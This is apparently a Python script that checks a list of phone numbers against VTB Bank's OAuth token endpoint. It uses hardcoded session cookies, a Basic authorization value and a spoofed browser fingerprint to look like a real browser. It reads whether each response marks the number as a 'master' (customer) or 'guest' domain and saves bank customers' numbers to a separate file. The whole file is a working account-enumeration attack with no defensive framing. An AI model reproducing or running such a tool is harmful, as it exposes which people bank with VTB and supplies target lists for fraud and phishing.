# -*- coding:utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
import json
import time


def check():
   session = requests.Session()
   headers ={
      'Host':'cl.vtb.ru',
      'Accept-Encoding' : 'gzip, deflate, br',
      'Content-Length' : '58',
      'Origin': 'https://cl.vtb.ru',
      'Connection': 'keep-alive',
      'Referer': 'https://cl.vtb.ru/sms-confirmation',
      'Cookie': 'rxVisitor=1678780489257FHBRJLH78PEQQEVOQGOSG2GCMF1145FS; dtSa=-; dtLatC=6; _ym_uid=1677250294707066510; _ym_d=1678780491; tmr_lvid=48f566c6f3a52d5cf4f0ea12b9a433a6; tmr_lvidTS=1677599999156; _a_d3t6sf=duXOe3Q_WDNC3aEqQkbVm4HT; pixel_sess_id=cec554c6-c9f4-4cec-9f5d-0aea29e7de21; dtPC=4$580489517_97h-vQCFPEKRPACVHRCPHAOLCFAFFMDPEHHDW-0e0; rxvt=1678782594309|1678780794309; dec214c42a5e08c247c5494352d82fb1=a3248a011941c92c86f3bcbfdcc1d9e7; dtCookie=v_4_srv_9_sn_373780DC920EA1222B381D1558EE13AC_perc_100000_ol_0_mul_1_app-3A05cd39c87638cb2c_1; upnv=!JANwXi3YY5h49PV9lgdosoOvXBH+TPG80tuReyqgKbkcf3RDSH7rqaoiho5zHtK6Zqp/d6EpmFwUb1yQDfAVP9IuWnb0nSi+74NV25w=; pixel_user_fp=406a466d479a9d2a0c106f2fe5e1d934; pixel_user_dt=1678877610591; adrcid=ARNZHjZKsH8fWKvVPtnTjrg; _ym_isad=2; client_source={"utmSource":"www.vtb.ru","utmMedium":"referral","utmCampaign":"(not set)","utmTerm":"(not set)","utmContent":"(not set)","utmGa":"","actionId":""}; utm_source=www.vtb.ru; utm_medium=referral; utm_campaign=(not set); utm_term=(not set); utm_content=(not set); tmr_detect=0%7C1679408127889; _ym_visorc=b',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/100.0',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': 'Basic TWFsenNSQWtzUVh3QW9lVHFNQ3ptR3k3WldnYToyVUJ4bHpXWjZuaHQ2RWsybWhxOVNPT0Q3cmdh',
      'X-Finger-Print': 'JTdCJTIyZm9udHMlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQSU1QiUyMkFnZW5jeSUyMEZCJTIyJTJDJTIyQXJpYWwlMjBVbmljb2RlJTIwTVMlMjIlMkMlMjJDYWxpYnJpJTIyJTJDJTIyQ2VudHVyeSUyMiUyQyUyMkNlbnR1cnklMjBHb3RoaWMlMjIlMkMlMjJGcmFua2xpbiUyMEdvdGhpYyUyMiUyQyUyMkhFTFYlMjIlMkMlMjJIYWV0dGVuc2Nod2VpbGVyJTIyJTJDJTIyTHVjaWRhJTIwQnJpZ2h0JTIyJTJDJTIyTHVjaWRhJTIwU2FucyUyMiUyQyUyMk1TJTIwT3V0bG9vayUyMiUyQyUyMk1TJTIwUmVmZXJlbmNlJTIwU3BlY2lhbHR5JTIyJTJDJTIyTVMlMjBVSSUyMEdvdGhpYyUyMiUyQyUyMk1UJTIwRXh0cmElMjIlMkMlMjJNYXJsZXR0JTIyJTJDJTIyTWVpcnlvJTIwVUklMjIlMkMlMjJNb25vdHlwZSUyMENvcnNpdmElMjIlMkMlMjJQcmlzdGluYSUyMiUyQyUyMlNlZ29lJTIwVUklMjBMaWdodCUyMiUyQyUyMlNtYWxsJTIwRm9udHMlMjIlNUQlMkMlMjJkdXJhdGlvbiUyMiUzQTEwMiU3RCUyQyUyMmRvbUJsb2NrZXJzJTIyJTNBJTdCJTIyZHVyYXRpb24lMjIlM0ExJTdEJTJDJTIyZm9udFByZWZlcmVuY2VzJTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElN0IlMjJkZWZhdWx0JTIyJTNBMTQ5LjM1MDAwNjEwMzUxNTYyJTJDJTIyYXBwbGUlMjIlM0ExNDkuMzUwMDA2MTAzNTE1NjIlMkMlMjJzZXJpZiUyMiUzQTE0OS4zNTAwMDYxMDM1MTU2MiUyQyUyMnNhbnMlMjIlM0ExNDQuMDE2NjYyNTk3NjU2MjUlMkMlMjJtb25vJTIyJTNBMTE5JTJDJTIybWluJTIyJTNBOS4zNjY2Njg3MDExNzE4NzUlMkMlMjJzeXN0ZW0lMjIlM0ExNDcuODk5OTkzODk2NDg0MzglN0QlMkMlMjJkdXJhdGlvbiUyMiUzQTE0NSU3RCUyQyUyMmF1ZGlvJTIyJTNBJTdCJTIydmFsdWUlMjIlM0EzNS43MzgzMjk1OTMwOTIyJTJDJTIyZHVyYXRpb24lMjIlM0ExNDUlN0QlMkMlMjJzY3JlZW5GcmFtZSUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTVCMCUyQzAlMkM0MCUyQzAlNUQlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJvc0NwdSUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTIyV2luZG93cyUyME5UJTIwMTAuMCUzQiUyMFdpbjY0JTNCJTIweDY0JTIyJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIybGFuZ3VhZ2VzJTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElNUIlNUIlMjJydS1SVSUyMiU1RCUyQyU1QiUyMnJ1LVJVJTIyJTJDJTIycnUlMjIlMkMlMjJlbi1VUyUyMiUyQyUyMmVuJTIyJTVEJTVEJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIyY29sb3JEZXB0aCUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBMjQlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJkZXZpY2VNZW1vcnklMjIlM0ElN0IlMjJkdXJhdGlvbiUyMiUzQTElN0QlMkMlMjJzY3JlZW5SZXNvbHV0aW9uJTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElNUIxOTIwJTJDMTIwMCU1RCUyQyUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMmhhcmR3YXJlQ29uY3VycmVuY3klMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQTIlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJ0aW1lem9uZSUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTIyQWZyaWNhJTJGS2hhcnRvdW0lMjIlMkMlMjJkdXJhdGlvbiUyMiUzQTMlN0QlMkMlMjJzZXNzaW9uU3RvcmFnZSUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBdHJ1ZSUyQyUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMmxvY2FsU3RvcmFnZSUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBdHJ1ZSUyQyUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMmluZGV4ZWREQiUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBdHJ1ZSUyQyUyMmR1cmF0aW9uJTIyJTNBMSU3RCUyQyUyMm9wZW5EYXRhYmFzZSUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBZmFsc2UlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJjcHVDbGFzcyUyMiUzQSU3QiUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMnBsYXRmb3JtJTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElMjJXaW4zMiUyMiUyQyUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMnBsdWdpbnMlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQSU1QiU3QiUyMm5hbWUlMjIlM0ElMjJQREYlMjBWaWV3ZXIlMjIlMkMlMjJkZXNjcmlwdGlvbiUyMiUzQSUyMlBvcnRhYmxlJTIwRG9jdW1lbnQlMjBGb3JtYXQlMjIlMkMlMjJtaW1lVHlwZXMlMjIlM0ElNUIlN0IlMjJ0eXBlJTIyJTNBJTIyYXBwbGljYXRpb24lMkZwZGYlMjIlMkMlMjJzdWZmaXhlcyUyMiUzQSUyMnBkZiUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJ0ZXh0JTJGcGRmJTIyJTJDJTIyc3VmZml4ZXMlMjIlM0ElMjJwZGYlMjIlN0QlNUQlN0QlMkMlN0IlMjJuYW1lJTIyJTNBJTIyQ2hyb21lJTIwUERGJTIwVmlld2VyJTIyJTJDJTIyZGVzY3JpcHRpb24lMjIlM0ElMjJQb3J0YWJsZSUyMERvY3VtZW50JTIwRm9ybWF0JTIyJTJDJTIybWltZVR5cGVzJTIyJTNBJTVCJTdCJTIydHlwZSUyMiUzQSUyMmFwcGxpY2F0aW9uJTJGcGRmJTIyJTJDJTIyc3VmZml4ZXMlMjIlM0ElMjJwZGYlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIydGV4dCUyRnBkZiUyMiUyQyUyMnN1ZmZpeGVzJTIyJTNBJTIycGRmJTIyJTdEJTVEJTdEJTJDJTdCJTIybmFtZSUyMiUzQSUyMkNocm9taXVtJTIwUERGJTIwVmlld2VyJTIyJTJDJTIyZGVzY3JpcHRpb24lMjIlM0ElMjJQb3J0YWJsZSUyMERvY3VtZW50JTIwRm9ybWF0JTIyJTJDJTIybWltZVR5cGVzJTIyJTNBJTVCJTdCJTIydHlwZSUyMiUzQSUyMmFwcGxpY2F0aW9uJTJGcGRmJTIyJTJDJTIyc3VmZml4ZXMlMjIlM0ElMjJwZGYlMjIlN0QlMkMlN0IlMjJ0eXBlJTIyJTNBJTIydGV4dCUyRnBkZiUyMiUyQyUyMnN1ZmZpeGVzJTIyJTNBJTIycGRmJTIyJTdEJTVEJTdEJTJDJTdCJTIybmFtZSUyMiUzQSUyMk1pY3Jvc29mdCUyMEVkZ2UlMjBQREYlMjBWaWV3ZXIlMjIlMkMlMjJkZXNjcmlwdGlvbiUyMiUzQSUyMlBvcnRhYmxlJTIwRG9jdW1lbnQlMjBGb3JtYXQlMjIlMkMlMjJtaW1lVHlwZXMlMjIlM0ElNUIlN0IlMjJ0eXBlJTIyJTNBJTIyYXBwbGljYXRpb24lMkZwZGYlMjIlMkMlMjJzdWZmaXhlcyUyMiUzQSUyMnBkZiUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJ0ZXh0JTJGcGRmJTIyJTJDJTIyc3VmZml4ZXMlMjIlM0ElMjJwZGYlMjIlN0QlNUQlN0QlMkMlN0IlMjJuYW1lJTIyJTNBJTIyV2ViS2l0JTIwYnVpbHQtaW4lMjBQREYlMjIlMkMlMjJkZXNjcmlwdGlvbiUyMiUzQSUyMlBvcnRhYmxlJTIwRG9jdW1lbnQlMjBGb3JtYXQlMjIlMkMlMjJtaW1lVHlwZXMlMjIlM0ElNUIlN0IlMjJ0eXBlJTIyJTNBJTIyYXBwbGljYXRpb24lMkZwZGYlMjIlMkMlMjJzdWZmaXhlcyUyMiUzQSUyMnBkZiUyMiU3RCUyQyU3QiUyMnR5cGUlMjIlM0ElMjJ0ZXh0JTJGcGRmJTIyJTJDJTIyc3VmZml4ZXMlMjIlM0ElMjJwZGYlMjIlN0QlNUQlN0QlNUQlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJ0b3VjaFN1cHBvcnQlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQSU3QiUyMm1heFRvdWNoUG9pbnRzJTIyJTNBMCUyQyUyMnRvdWNoRXZlbnQlMjIlM0FmYWxzZSUyQyUyMnRvdWNoU3RhcnQlMjIlM0FmYWxzZSU3RCUyQyUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMnZlbmRvciUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTIyJTIyJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIydmVuZG9yRmxhdm9ycyUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTVCJTVEJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIyY29va2llc0VuYWJsZWQlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQXRydWUlMkMlMjJkdXJhdGlvbiUyMiUzQTElN0QlMkMlMjJjb2xvckdhbXV0JTIyJTNBJTdCJTIydmFsdWUlMjIlM0ElMjJzcmdiJTIyJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIyaW52ZXJ0ZWRDb2xvcnMlMjIlM0ElN0IlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJmb3JjZWRDb2xvcnMlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQWZhbHNlJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIybW9ub2Nocm9tZSUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBMCUyQyUyMmR1cmF0aW9uJTIyJTNBMCU3RCUyQyUyMmNvbnRyYXN0JTIyJTNBJTdCJTIydmFsdWUlMjIlM0EwJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIycmVkdWNlZE1vdGlvbiUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBZmFsc2UlMkMlMjJkdXJhdGlvbiUyMiUzQTAlN0QlMkMlMjJoZHIlMjIlM0ElN0IlMjJ2YWx1ZSUyMiUzQWZhbHNlJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTJDJTIybWF0aCUyMiUzQSU3QiUyMnZhbHVlJTIyJTNBJTdCJTIyYWNvcyUyMiUzQTEuNDQ3MzU4ODY1ODI3ODUyMiUyQyUyMmFjb3NoJTIyJTNBNzA5Ljg4OTM1NTgyMjcyNiUyQyUyMmFjb3NoUGYlMjIlM0EzNTUuMjkxMjUxNTAxNjQzJTJDJTIyYXNpbiUyMiUzQTAuMTIzNDM3NDYwOTY3MDQ0MzUlMkMlMjJhc2luaCUyMiUzQTAuODgxMzczNTg3MDE5NTQzJTJDJTIyYXNpbmhQZiUyMiUzQTAuODgxMzczNTg3MDE5NTQyOSUyQyUyMmF0YW5oJTIyJTNBMC41NDkzMDYxNDQzMzQwNTQ4JTJDJTIyYXRhbmhQZiUyMiUzQTAuNTQ5MzA2MTQ0MzM0MDU0OCUyQyUyMmF0YW4lMjIlM0EwLjQ2MzY0NzYwOTAwMDgwNjElMkMlMjJzaW4lMjIlM0EwLjgxNzg4MTkxMjExNTkwODUlMkMlMjJzaW5oJTIyJTNBMS4xNzUyMDExOTM2NDM4MDE0JTJDJTIyc2luaFBmJTIyJTNBMi41MzQzNDIxMDc4NzMzMjQlMkMlMjJjb3MlMjIlM0EtMC44MzkwNzE1MjkwMDk1Mzc3JTJDJTIyY29zaCUyMiUzQTEuNTQzMDgwNjM0ODE1MjQzNyUyQyUyMmNvc2hQZiUyMiUzQTEuNTQzMDgwNjM0ODE1MjQzNyUyQyUyMnRhbiUyMiUzQS0xLjQyMTQ0ODgyMzg3NDcyNDUlMkMlMjJ0YW5oJTIyJTNBMC43NjE1OTQxNTU5NTU3NjQ5JTJDJTIydGFuaFBmJTIyJTNBMC43NjE1OTQxNTU5NTU3NjQ5JTJDJTIyZXhwJTIyJTNBMi43MTgyODE4Mjg0NTkwNDUlMkMlMjJleHBtMSUyMiUzQTEuNzE4MjgxODI4NDU5MDQ1JTJDJTIyZXhwbTFQZiUyMiUzQTEuNzE4MjgxODI4NDU5MDQ1JTJDJTIybG9nMXAlMjIlM0EyLjM5Nzg5NTI3Mjc5ODM3MDclMkMlMjJsb2cxcFBmJTIyJTNBMi4zOTc4OTUyNzI3OTgzNzA3JTJDJTIycG93UEklMjIlM0ExLjkyNzU4MTQxNjA1NjAyMDZlLTUwJTdEJTJDJTIyZHVyYXRpb24lMjIlM0EwJTdEJTdE'
         }
   
   with open('base.txt', 'r') as src:
    nums = src.readlines()
    clients = 0
    no_clients = 0
    for i in nums:
        data = {
            'phone_number': f'{int(i)}',
            'grant_type': 'guest_auth',
            'scope': 'openid'
        }

        try:
            r = session.post('https://cl.vtb.ru/oauth2/token', headers=headers, data=data)
            time.sleep(6.66)
            if r.status_code == 401:
                j = json.loads(r.text)  # обрезаем лишнее обрамление у JSON
                with open('vtb1.json', 'w+') as src:
                    src.write(json.dumps(j, indent=2))
                with open('vtb1.json', 'r', encoding='utf-8') as sr:
                    check = sr.read()
                    templates = json.loads(check)
                out = templates['additional_properties']['domain']
                if out == 'master':
                    with open('fold/vtb.txt', 'a') as s:
                        clients += 1
                        s.write(i)
                    print(f'|RESULT| => |CLIENT| |{clients}|')
                    s.close()

                if out == 'guest':
                    with open('fold/Novtb.txt', 'a') as s:
                        no_clients += 1
                        s.write(i)
                    print(f'|RESULT| => |NO CLIENT| |{no_clients}|')
                    s.close()

                # Pause for 10 seconds after every 7 requests
                

        except:
            print(f'|CONNECTION CLOSED|')
            time.sleep(3)
            continue       
                     
            
               
                 
            
         
check()